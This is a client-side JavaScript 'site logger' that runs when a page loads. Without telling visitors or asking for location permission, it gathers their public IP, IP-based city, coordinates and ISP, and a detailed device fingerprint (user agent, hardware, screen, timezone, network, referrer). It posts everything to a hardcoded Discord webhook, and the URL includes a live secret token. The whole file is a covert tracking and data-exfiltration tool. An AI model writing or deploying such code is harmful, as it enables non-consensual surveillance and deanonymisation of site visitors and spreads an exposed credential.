// Client-side device + IP-based geo logger (NO browser geolocation permission requested)
// Sends a Discord embed directly to the webhook you provided.
// WARNING: Exposes the webhook URL in client JS. Use a server proxy if you want to keep it secret.

(async function sendDeviceAndIP() {
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422268364277026997/k9wR4nxStUvt1XQktWrSUh9RRHyrzp9hzxUEN9AIXr0gI4Sfwxvef882oVz5iitC8Ng-';

  const safeSlice = (s, n = 900) => (typeof s === 'string' ? s.slice(0, n) : String(s));

  try {
    // --- 1) Get public IP ---
    const ipResp = await fetch('https://api.ipify.org?format=json').catch(() => null);
    const ipJson = ipResp ? await ipResp.json().catch(() => null) : null;
    const ip = ipJson && ipJson.ip ? ipJson.ip : 'unknown';

    // --- 2) IP-based geolocation/provider (ipapi.co used here) ---
    let geo = {};
    try {
      const g = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());
      geo = g || {};
    } catch (e) { geo = {}; }

    // --- 3) UA / Client Hints (if available) & other navigator data ---
    const ua = navigator.userAgent || 'unknown';
    let uaCh = {};
    if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
      try {
        uaCh = await navigator.userAgentData.getHighEntropyValues([
          'architecture','model','platform','platformVersion','uaFullVersion','bitness','fullVersionList'
        ]);
      } catch (e) { uaCh = {}; }
    }
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;

    const device = {
      userAgent: ua,
      userAgentHints: uaCh,                          // may be empty
      platform: navigator.platform || 'unknown',
      language: navigator.language || 'unknown',
      screen: `${window.screen.width}x${window.screen.height}`,
      viewport: `${window.innerWidth}x${window.innerHeight}`,
      hardwareConcurrency: navigator.hardwareConcurrency || null,
      deviceMemory: navigator.deviceMemory || null,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || 'unspecified',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
      timezoneOffsetMinutes: new Date().getTimezoneOffset(),
      connection: connection ? {
        effectiveType: connection.effectiveType || null,
        downlink: connection.downlink || null,
        rtt: connection.rtt || null,
      } : null
    };

    // --- 4) Metadata ---
    const meta = {
      timestamp: new Date().toISOString(),
      page: location.href,
      referrer: document.referrer || 'none'
    };

    // --- 5) Build Discord embed payload (compact, truncated where needed) ---
    // Discord embed field value limits: ~1024 chars per field. Truncate long values.
    const fields = [
      { name: 'IP', value: ip, inline: true },
      { name: 'ISP / Org', value: safeSlice(geo.org || geo.network || geo.org_name || 'N/A'), inline: true },
      { name: 'ASN', value: (geo.asn || geo.asn_org || geo.org || 'N/A'), inline: true },
      { name: 'City / Region', value: `${geo.city || 'N/A'} / ${geo.region || 'N/A'}`, inline: true },
      { name: 'Country', value: `${geo.country_name || 'N/A'} (${geo.country || 'N/A'})`, inline: true },
      { name: 'IP Lat/Lon', value: `${geo.latitude || 'N/A'}, ${geo.longitude || 'N/A'}`, inline: true },
      { name: 'Timezone', value: geo.timezone || device.timezone || 'N/A', inline: true },
      { name: 'User-Agent', value: safeSlice(device.userAgent, 1000) },
      { name: 'Platform', value: device.platform || 'N/A', inline: true },
      { name: 'Screen', value: device.screen || 'N/A', inline: true },
      { name: 'Viewport', value: device.viewport || 'N/A', inline: true },
      { name: 'Cores / Mem', value: `${device.hardwareConcurrency || 'N/A'} cores / ${device.deviceMemory || 'N/A'} GB`, inline: true },
      { name: 'Network Hints', value: device.connection ? `type: ${device.connection.effectiveType || 'N/A'}, downlink: ${device.connection.downlink || 'N/A'}, rtt: ${device.connection.rtt || 'N/A'}` : 'N/A', inline: true },
      { name: 'Max Touch Points', value: String(device.maxTouchPoints || 0), inline: true },
      { name: 'DNT / Cookies', value: `DNT: ${device.doNotTrack} / Cookies: ${device.cookieEnabled}`, inline: true },
      { name: 'Page / Referrer', value: `${meta.page}\nref: ${meta.referrer}` }
    ];

    // Remove fields with empty values to keep the embed tidy
    const filteredFields = fields.filter(f => f.value && f.value !== 'N/A' && f.value !== '');

    const embed = {
      title: 'Device Info Captured (no GPS permission)',
      description: `Captured at ${meta.timestamp}`,
      fields: filteredFields,
      footer: { text: `IP provider: ipapi.co — raw fields may vary` },
      color: 0x8A2BE2
    };

    const payload = {
      username: 'site logger <3',
      avatar_url: 'https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg',
      content: '', // you had @here earlier; remove to avoid mass pings, or re-add if you want it
      embeds: [embed]
    };

    // --- 6) Send to webhook ---
    const res = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (res.ok) {
      console.log('Logger: sent to webhook');
    } else {
      // Discord may reject for embed size; log text for debugging
      console.warn('Logger: webhook responded', res.status, await res.text().catch(()=>'(no body)'));
    }

  } catch (err) {
    console.error('Logger error:', err);
  }
})();

